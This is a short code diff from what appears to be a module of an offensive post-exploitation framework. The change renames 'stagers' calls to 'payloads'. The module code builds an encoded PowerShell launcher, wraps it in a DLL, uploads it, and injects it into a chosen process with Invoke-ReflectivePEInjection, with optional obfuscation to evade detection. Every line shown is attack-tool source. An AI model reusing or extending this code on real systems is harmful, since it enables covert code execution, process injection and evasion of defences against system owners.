@@ -131,7 +131,7 @@ class Module:
             return ''
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
 
             if launcher == '':
                 print helpers.color('[!] Error in launcher generation.')
@@ -141,9 +141,9 @@ class Module:
 
                 scriptEnd += "Invoke-ReflectivePEInjection -PEPath %s -ProcName %s " % (fullUploadPath, procName)
 
-                dll = self.mainMenu.stagers.generate_dll(launcherCode, arch)
+                dll = self.mainMenu.payloads.generate_dll(launcherCode, arch)
 
-                UploadScript = self.mainMenu.stagers.generate_upload(dll, fullUploadPath)
+                UploadScript = self.mainMenu.payloads.generate_upload(dll, fullUploadPath)
 
                 if obfuscate:
                     scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
